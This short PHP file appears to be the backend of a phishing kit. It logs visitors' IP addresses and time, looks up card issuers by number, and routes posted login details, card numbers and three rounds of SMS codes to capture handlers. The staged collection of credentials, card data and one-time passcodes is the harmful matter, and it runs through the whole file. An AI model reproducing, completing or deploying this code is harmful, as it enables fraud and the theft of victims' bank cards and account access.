<?php

function getUserIP() {
    if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
            $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
            return trim($addr[0]);
        } else {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
    }
    else {
        return $_SERVER['REMOTE_ADDR'];
    }
}
$ip = getUserIP();
$TIME_DATE = date('H:i:s d/m/Y');
function bankinfo($CARDNUMBER){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/$CARDNUMBER");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$headers = array();
$headers[] = "Accept-Version: 3";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
return $result;
}
switch ($_POST['action']){
    case 'login':
    Login($_POST);
    break;

    case 'card':
    Card($_POST,json_decode(bankinfo($_POST['num'])));
    break;
    
    case 'sms1':
    Sms1($_POST,$_SESSION['CC'],$_SESSION['BNK']);
    break;
    
    case 'sms2':
    Sms2($_POST,$_SESSION['CC'],$_SESSION['BNK']);
    break;
    
    case 'sms3':
    Sms3($_POST,$_SESSION['CC'],$_SESSION['BNK']);
    break;
}

